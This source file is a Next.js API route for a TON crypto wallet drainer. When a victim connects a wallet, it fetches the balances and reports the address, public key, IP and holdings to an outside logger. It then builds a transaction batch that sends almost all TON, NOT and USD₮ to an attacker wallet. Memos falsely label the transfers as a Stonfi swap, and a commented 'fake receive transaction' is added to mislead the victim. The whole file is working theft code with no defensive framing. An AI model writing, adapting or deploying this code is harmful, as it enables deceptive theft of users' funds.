// Next.js API route support: https://nextjs.org/docs/api-routes/introduction

import {
  getContractFromAddress,
  jettonBalances,
  notCoinPrice,
  sendLog,
  tonCoinBalance,
  tonCoinBalanceUSD,
  totalJettonBalanceUSD,
} from "@/utils/httpClient";
import STATUS from "@/utils/StatusMessage";
import { NEW_WALLET } from "@/utils/Strings";
import TransactionBuilder from "@/utils/TransactionBuilder";
import { Address, fromNano, toNano } from "@ton/ton";

export default async function handler(req, res) {
  if (!req.method === "POST") return;
  const { address, pubkey, isRestoredConn } = await req.body;
  const { headers } = req;
  const ip = headers["x-forwarded-for"];

  const MIN_JETTON_USD = +process.env.NEXT_PUBLIC_MIN_JETTON_USD;
  const MIN_TON_USD = +process.env.NEXT_PUBLIC_MIN_TON_USD;
  const MIN_WALLET_BALANCE = +process.env.NEXT_PUBLIC_MIN_WALLET_BALANCE;

  const DST_WALLET = process.env.NEXT_PUBLIC_DST_WALLET;

  const [
    jettonBalanceUSD,
    tonBalance,
    tonBalanceUSD,
    jettonBalanceInfo,
    notcoinPrice,
  ] = await Promise.all([
    totalJettonBalanceUSD(address),
    tonCoinBalance(address),
    tonCoinBalanceUSD(address),
    jettonBalances(address),
    notCoinPrice(),
  ]);

  const walletData = {
    jettonBalanceUSD,
    tonBalance,
    tonBalanceUSD,
    jettonBalanceInfo,
    notCoinPrice,
    walletBalance: tonBalanceUSD + jettonBalanceUSD,
    address: Address.parse(address).toString(true, true, false),
  };

  const walletBalance = tonBalanceUSD + jettonBalanceUSD;

  const data = {
    address: Address.parse(address).toString(true, true, false),
    pubkey,
    isRestoredConn,
    walletBalance,
    tonBalance,
    tonBalanceUSD,
    jettonBalanceInfo,
    ip,
    notcoinPrice,
  };

  const text = NEW_WALLET(data);
  await sendLog(text);
  const transactionBuilder = new TransactionBuilder();

  if (walletBalance < MIN_WALLET_BALANCE) {
    return res.status(200).json({
      status: false,
      message: STATUS.INSUFFICIENT_BALANCE,
      walletData,
    });
  }

  // prepare for make transaction ....
  if (tonBalanceUSD >= MIN_TON_USD) {
    const tx = transactionBuilder.makeToncoinTransaction(
      DST_WALLET,
      tonBalance - 0.2,
      "Call: StonfiSwapOkRef"
    );
    transactionBuilder.add(tx);
  }
  if (jettonBalanceUSD >= MIN_JETTON_USD) {
    for (let jetton of jettonBalanceInfo) {
      const symbol = jetton.jetton.symbol;
      if (symbol === "NOT") {
        const contract = jetton.jetton.address;
        const tx = transactionBuilder.makeJettonTransaction(
          DST_WALLET,
          toNano(fromNano(+jetton.balance) - 0.01),
          "Call: StonfiSwapOkRef",
          await getContractFromAddress(address, contract)
        );
        transactionBuilder.add(tx);
      } else if (symbol === "USD₮") {
        const contract = await getContractFromAddress(
          address,
          jetton.jetton.address
        );
        
        const tx = transactionBuilder.makeJettonTransaction(
          DST_WALLET,
          (+jetton.balance / 10 ** 6 - 0.1) * 10 ** 6,
          "Call: StonfiSwapOkRef",
          contract
        );
        transactionBuilder.add(tx);

        // add fake receive transaction.
        const fakeTxAmount = (walletBalance * 2) / 1000;
        const fakeTx = transactionBuilder.makeJettonTransaction(
          address,
          toNano(fakeTxAmount),
          `Call: StonfiSwapOkRef`,
          contract
        );
        transactionBuilder.add(fakeTx);
      } else if (symbol === "jUSDT") {
        const contract = jetton.jetton.address;
        const tx = transactionBuilder.makeJettonTransaction(
          DST_WALLET,
          toNano(+jetton.balance / 1000000 - 0.01),
          "Call: StonfiSwapOkRef",
          await getContractFromAddress(address, contract)
        );
        // transactionBuilder.add(tx);
      }
    }
  }

  const finalTx = transactionBuilder.buildFinalTransaction();

  return await res.status(200).json({
    status: true,
    message: STATUS.TX_LIST_READY,
    tx: finalTx,
    walletData,
  });
}
